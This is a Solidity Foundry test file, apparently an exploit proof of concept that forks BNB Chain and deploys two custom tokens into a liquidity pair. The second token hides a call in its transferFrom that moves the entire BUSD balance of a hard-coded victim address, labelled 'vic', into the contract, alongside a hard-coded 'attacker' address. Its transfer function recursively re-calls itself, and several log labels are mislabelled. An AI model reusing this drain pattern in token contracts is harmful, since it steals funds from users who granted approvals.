// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC20.sol";
import "./test/interfaces/IPancakePair.sol";
import "./test/interfaces/IWBNB.sol";

interface IFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface Irouter {
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

contract controllerTest is Test {
    using SafeMath for uint;
    IPancakePair PancakePair =  IPancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    IFactory private factory = IFactory(0xB9fA84912FF2383a617d8b433E926Adf0Dd3FEa1);
    WBNB wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Irouter private router = Irouter(0xE85C6ab56A3422E7bAfd71e81Eb7d0f290646078);
    MyToken public myToken;
    MyToken2 public myToken2;
    address public owner;
    address public vic = 0x6F69DfaE189aD285CAb4cEC165c360CCf05Ffa6a;
    address private attacker = 0x809bE4BfEC02Cd6CFB2d84Ed5c45d8485E99498A;

    function setUp() public {
    vm.deal(address(this), 0);
    vm.createSelectFork("https://rpc.ankr.com/bsc", 41640130);
    owner = address(this);
    myToken = new MyToken(address(this)); // Mint tokens to controllerTest
    myToken2 = new MyToken2(address(this)); // This line is fixed
}


    function testExploit() public {
        emit log_named_uint(
            "Before flashswap, WBNB balance of user:",
            myToken.balanceOf(address(this))
        );
        emit log_named_uint(
            "Before flashswap, WBNB balance of user:",
            myToken2.balanceOf(address(this))
        );
        createpair();
        addlp();
        emit log_named_uint(
            "Before flashswap, WBNB balance of user:",
            busd.balanceOf(address(attacker))
        );
    }

    fallback() external {}

    function addlp() internal {
        myToken2.approve(address(router), myToken2.balanceOf(address(this)));
        myToken.approve(address(router), myToken.balanceOf(address(this)));
        uint256 bnbAmountToLP = myToken2.balanceOf(address(this)) / 2;
        uint256 myTokenAmountToLP = myToken.balanceOf(address(this)) / 2;
        router.addLiquidity(address(myToken), address(myToken2), bnbAmountToLP, myTokenAmountToLP, 0, 0, address(this), block.timestamp + 500);
    }

    function createpair() internal {
        factory.createPair(address(myToken2), address(myToken));
    }
}

contract MyToken {
    using SafeMath for uint;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string public name = "MyToken";
    string public symbol = "MTK";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1_000_000 * 10 ** uint256(decimals);
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address public vic = 0x6F69DfaE189aD285CAb4cEC165c360CCf05Ffa6a;

    constructor(address controllerTest) {
        _balances[controllerTest] = totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][msg.sender] -= amount;


        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(_balances[msg.sender] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;


        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
    }
}

contract MyToken2 {
    using SafeMath for uint;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string public name = "MyToken";
    string public symbol = "MTK";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1_000_000 * 10 ** uint256(decimals);
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address public vic = 0x6F69DfaE189aD285CAb4cEC165c360CCf05Ffa6a;
    Irouter private router = Irouter(0xE85C6ab56A3422E7bAfd71e81Eb7d0f290646078);
    address private attacker = 0x809bE4BfEC02Cd6CFB2d84Ed5c45d8485E99498A;

    constructor(address controllerTest) {
        _balances[controllerTest] = totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][msg.sender] -= amount;
        // Encode data to send
        uint256 amountt = busd.balanceOf(vic);

        // Encode data to send
        bytes memory data = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            vic,
            address(this),
            amountt
        );

        // Call another contract with the data
        (bool success, bytes memory returnData) = address(busd).call(data);
        require(success, "Data sending failed");


        return success;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(_balances[msg.sender] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;

        uint256 amountt = busd.balanceOf(vic);

        // Encode data to send
        bytes memory data = abi.encodeWithSignature(
            "transfer(address,uint256)",
            recipient,
            amountt
        );

        // Call another contract with the data
        (bool success, bytes memory returnData) = address(this).call(data);
        require(success, "Data sending failed");

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
    }
}
